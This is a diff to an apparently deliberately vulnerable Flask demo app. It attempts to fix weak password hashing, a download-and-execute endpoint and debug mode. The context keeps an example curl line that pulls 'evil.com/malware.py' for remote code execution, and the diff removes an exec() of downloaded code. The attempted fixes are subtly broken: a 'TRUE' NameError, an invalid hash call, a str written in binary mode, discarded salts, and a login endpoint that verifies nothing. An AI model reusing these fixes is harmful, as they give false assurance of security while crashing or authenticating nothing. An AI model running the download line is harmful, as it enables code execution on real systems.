@@ -12,6 +12,8 @@ from cryptography.fernet import Fernet
 from pathlib import Path
 import os, subprocess, sqlite3, pickle, base64, logging, urllib.request
 import hashlib, hmac, time, struct
+from urllib.parse import urlparse 
+import binascii
 from xml.etree import ElementTree as ET  
 # XXE unsafe in some parsers; stdlib is still used here for demo
 # Note: Real XXE typically requires parsers that load external entities (e.g., lxml without defenses).
@@ -394,12 +396,12 @@ curl -X POST http://localhost:5000/crypto/md5_login -d "username=test&password=p
 """
 @app.post("/crypto/md5_login")
 def crypto_md5_login():
-    # ❌ BAD: explicitly MD5 for password verification
     username = request.form.get("username", "")
     password = request.form.get("password", "").encode()
-    # ❌ CRITICAL: MD5 is cryptographically broken!
-    digest = hashlib.md5(password).hexdigest()
-    return ok({"note": "never use MD5 for passwords", "username": username, "hash": digest})
+    salt = os.urandom(16)
+    digest = hashlib.sha256(salt + password).hexdigest()
+    salt_hex = salt.hex()
+    return ok({"note": "dont use md5 ", "username": username, "salt": salt_hex, "hash": digest})
 
 
 
@@ -443,10 +445,11 @@ curl -X POST http://localhost:5000/crypto/unsalted -d "password=password123"
 """
 @app.post("/crypto/unsalted")
 def crypto_unsalted():
-    # ❌ BAD: unsalted SHA-256
+    #Salting the password with sha256 hashing 
     password = request.form.get("password", "").encode()
-    # ❌ BAD: No salt means identical passwords have identical hashes
-    return ok({"hash": hashlib.sha256(password).hexdigest()})
+    salt  = os.urandom(16)
+    
+    return ok({"hash": hashlib.sha256(salt + password).hexdigest()})
 
 
 # ===================================================================================
@@ -540,13 +543,44 @@ curl "http://localhost:5000/code/download?url=http://evil.com/malware.py"
 - URL can point to any malicious content
 - Direct path to Remote Code Execution (RCE)
 """
+ALLOWED_DIR = {"example.com", "trusted.corp"}
+DOWNLOAD_DIR = "/tmp/download_code"
+os.makedirs(DOWNLOAD_DIR , exist_ok=TRUE)
 @app.get("/code/download")
 def code_download():
     url = request.args.get("url", "https://example.com/bad.py")
+    expected_hash = request.args.get("sha256","").lower().strip()
+    if not url:
+        return err ("error: the url is not specified",400)
+    parsed = urlparse(url)
+    domain = parsed.hostname or ""
+    if domain not in ALLOWED_DIR:
+        return err("Domain not allowed",403)
+
+    if not expected_hash or len(expected_hash)!=64:
+        return err("the hash is not valied ",400)
+
+    
+    
     # ❌ EXTREMELY DANGEROUS: download and execute without verifying integrity
-    code = urllib.request.urlopen(url, timeout=5).read().decode("utf-8")
-    exec(code, {})  # ❌ CRITICAL: Executes arbitrary code!
-    return ok({"executed_from": url})
+    try:
+        code = urllib.request.urlopen(url, timeout=5).read().decode("utf-8")
+    except Exception as e:
+        return err(f"the download didn't work reason {e}",404)
+
+    #computing the hash
+    actual_hash = hashlib.sha256(code).lower().hexdigest()
+    if actual_hash != expected_hash:
+        return err("The integrity of the code is violated")
+
+    filename = os.path.basename(parsed.path) or "download.py"
+    filepath = os.path.join(DOWNLOAD_DIR, filename)
+    with open(filepath, "wb") as f:
+        f.write(code)
+
+
+        
+    return ok({"Saved file from ": url})
 
 
 # ===================================================================================
@@ -1418,4 +1452,4 @@ if __name__ == "__main__":
     """
     # ❌ EXTREMELY DANGEROUS: Enabling debug True is itself risky in prod (leaks secrets/tracebacks)
     # This gives attackers an interactive Python shell through the web browser!
-    app.run(debug=True)  # NEVER use debug=True in production!
+    app.run(debug=False)  # NEVER use debug=True in production!
